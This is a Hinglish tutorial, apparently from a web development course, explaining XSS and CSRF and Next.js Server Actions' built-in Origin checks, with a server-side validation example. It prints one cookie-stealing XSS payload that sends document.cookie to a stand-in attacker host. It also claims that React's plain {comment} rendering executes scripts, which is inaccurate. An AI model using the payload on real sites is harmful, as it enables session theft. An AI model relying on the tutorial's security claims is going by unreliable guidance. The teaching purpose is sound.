8.1 mein samjha ki secrets kaise safe rakhte hain — `.env` + server-only. Par secrets toh ek problem thi — **dusri problem hai input.** Soch — Photo Gallery mein agar search form ho (koi bhi form), aur user kuch bhi type kar ke submit kare — `<script>alert('hacked')</script>` jaisa. Agar tumne woh input seedha database mein daal diya ya render kar diya — toh attacker ka script tumhari site pe chal jaayega. Yehi **XSS (Cross-Site Scripting)** hai.

Aur agar form ho (jaise "Add Comment"), aur koi attacker tumhari site ke user ko ek malicious link bheje — user click kare toh uske browser se tumhare form pe data submit ho jaaye bina uski marzi ke — yeh **CSRF (Cross-Site Request Forgery)** hai. 

Is file mein sirf **awareness level** pe samjhenge — ki kya problem hai, aur Next.js Server Actions mein yeh **built-in kaise solve hota hai.** Manual CSRF token banana nahi sikhenge (roadmap "awareness" kehta hai).

---

## Manual Problem — Client Input Pe Trust

Jab tum form se data lete ho aur seedha database mein daalte ho, tum implicitly **trust kar rahe ho** ki client sahi bhej raha hai. Par client pe user ka control hai — woh kuch bhi bhej sakta hai.

**XSS — Malicious Script Inject Karna:**

Agar comment form ho aur user yeh submit kare:

```html
<script>document.location='https://hacker.com/steal?cookie='+document.cookie</script>
```

Agar tumne yeh input seedha page pe render kar diya (bina sanitize kiye):

```tsx
// ❌ Galat — seedha render
<p>{comment}</p>
```

Browser sochega "yeh script hai" aur execute kar dega. Hacker ko tumhari session cookie mil jaayegi.

**CSRF — Form Submit Bina User Ki Marzi Ke:**

Agar tumhara form ho:

```html
<form action="/api/delete-photo" method="POST">
  <input type="hidden" name="photoId" value="5" />
  <button>Delete</button>
</form>
```

Attacker ek malicious page bana de jisme yeh form hidden ho. User us page pe aaye toh uske browser se form automatically submit ho jaaye — photo delete ho jaaye bina user ki marzi ke. **User ne click bhi nahi kiya, form submit ho gaya.**

---

## CONCEPT — Next.js Server Actions Ka Built-in CSRF Protection

Ab aata hai achha news — **Next.js Server Actions mein yeh sab built-in hai.**

Server Actions (Batch 3 mein seekha — `'use server'` directive) mein Next.js **automatic CSRF protection** lagata hai:

1. **Origin/Host Header Check** — Server Action call hone pe Next.js check karta hai ki request **tumhare domain se aa rahi hai** ya kisi aur jagah se. Agar kisi aur domain se aayi (malicious page se) — request reject ho jaati hai.

2. **Server-Side Only** — Server Action ka code sirf server pe chalta hai. Client ko sirf function ka reference milta hai — actual logic nahi. Isliye attacker directly function call nahi kar sakta.

**Iska matlab:** Agar tum Server Actions use kar rahe ho (Route Handlers nahi), toh CSRF protection **automatically hai.** Manual CSRF token banana padta nahi.

---

## CODE — Server Action Ka Built-in Protection

**File:** `app/actions.ts` — Server Action with automatic CSRF

```ts
'use server'

import { prisma } from "@/lib/prisma";

export async function deletePhoto(photoId: number) {
  // Next.js ne pehle se check kar liya:
  // 1. Origin header tumhare domain ka hai?
  // 2. Host header match karta hai?
  // Agar nahi → request reject, yahan tak pahunchega hi nahi

  await prisma.photo.delete({
    where: { id: photoId },
  });
}
```

Tumne kuch extra nahi kiya — bas `'use server'` likha. **Next.js khud CSRF check kar raha hai.**

---

## CONCEPT — Server-Side Validation (Awareness)

CSRF toh built-in hai, par **input validation tumhara kaam hai.** Client kuch bhi bhej sakta hai — tumhe server pe check karna hai:

```ts
'use server'

export async function addComment(photoId: number, text: string) {
  // ❌ Trusted input — kuch bhi aa sakta hai
  // await prisma.comment.create({ data: { photoId, text } });

  // ✅ Server-side validation
  if (!text || text.trim().length === 0) {
    throw new Error("Comment cannot be empty");
  }
  if (text.length > 500) {
    throw new Error("Comment too long (max 500 characters)");
  }
  if (!photoId || photoId <= 0) {
    throw new Error("Invalid photo ID");
  }

  await prisma.comment.create({
    data: { photoId, text: text.trim() },
  });
}
```

**Golden Rule:** Client ka input hamesha **server pe validate karo.** Client-side validation sirf UX ke liye hai (turant feedback) — server-side validation security ke liye (asli check).

## TEST — Verify CSRF Protection

1. Photo Gallery mein koi bhi Server Action call karo (jaise photo delete)
2. DevTools → Network tab → request pe click → Headers
3. `Origin` header dekho — tumhare domain ka hona chahiye (`http://localhost:3000`)
4. Ab dusre browser tab mein kholo `localhost:3000` aur console mein directly action call karo — kaam karega (same origin)

**Agar attacker ka page ho toh:**
- Attacker page `evil.com` pe hai
- Woh tumhare action ko call karta hai
- Next.js check karta hai: Origin = `evil.com`, expected = `localhost:3000` → **mismatch → reject**

Yehi CSRF protection hai — built-in, automatic, tumhe kuch nahi karna.

## Nutshell

**XSS** hai jab attacker malicious script inject kare tumhare page mein. **CSRF** hai jab attacker tumhare user ke browser se tumhare form ko submit karaye bina uski marzi ke. Next.js **Server Actions** mein CSRF protection **built-in** hai — Origin/Host header check se automatic reject. Tumhe sirf **server-side validation** karni hai — client input hamesha server pe validate karo, client-side sirf UX.

---

## What It Is NOT

- **Server Action = "CSRF fix-all" nahi.** CSRF built-in hai, par input validation tumhara kaam hai. Server Action mein bhi galat data insert ho sakta hai agar validate nahi kiya.
- **Client-side validation = security nahi.** Client-side validation sirf UX hai (turant feedback). Attacker client-side checks bypass kar sakta hai — hamesha server pe validate karo.
- **CSRF = "form submit attack" sirf nahi.** CSRF kisi bhi state-changing request pe ho sakta hai — form submit, button click, ya koi bhi mutation.
- **Manual CSRF token = "purana tareeka" nahi.** Express.js/Angular mein manual CSRF token standard hai. Next.js ne isse built-in kar diya — isliye tumhe alag se nahi karna padta.
